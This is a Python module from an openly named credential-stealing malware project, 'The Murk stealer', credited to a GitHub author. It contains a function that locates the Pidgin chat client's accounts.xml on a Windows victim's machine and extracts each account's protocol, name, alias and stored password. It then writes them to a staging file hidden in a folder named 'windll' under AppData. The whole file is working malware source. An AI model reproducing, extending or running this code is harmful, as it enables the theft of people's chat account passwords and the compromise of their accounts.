#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
import xml.etree.ElementTree as ET


def Pidgin(data):
    appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
    directory = [
        appdata + '\\.purple\\accounts.xml'
    ]

    logs = []
    
    for file in directory:
        if os.path.isfile(file):
            with open(file, "r", encoding="utf-8") as f:
                content = f.read()
            
            content = ET.fromstring(content)
            accounts = content.findall("account")
            for account in accounts:
                protocol = account.findtext("protocol")
                name = account.findtext('name')
                alias = account.findtext('alias')
                password = account.findtext('password')

                logs.append(f"""Protocol: {protocol}
Name: {name}
Alias: {alias}
Password: {password}
""")
        if logs:
            data.append("\n∟📨Pidgin")
            os.mkdir(pathtofile+"\\Pidgin\\")
            with open(pathtofile+"\\Pidgin\\accounts.txt", 'w', encoding='UTF-8') as f:
                for log in logs:
                    f.write(log+'\n')
    return data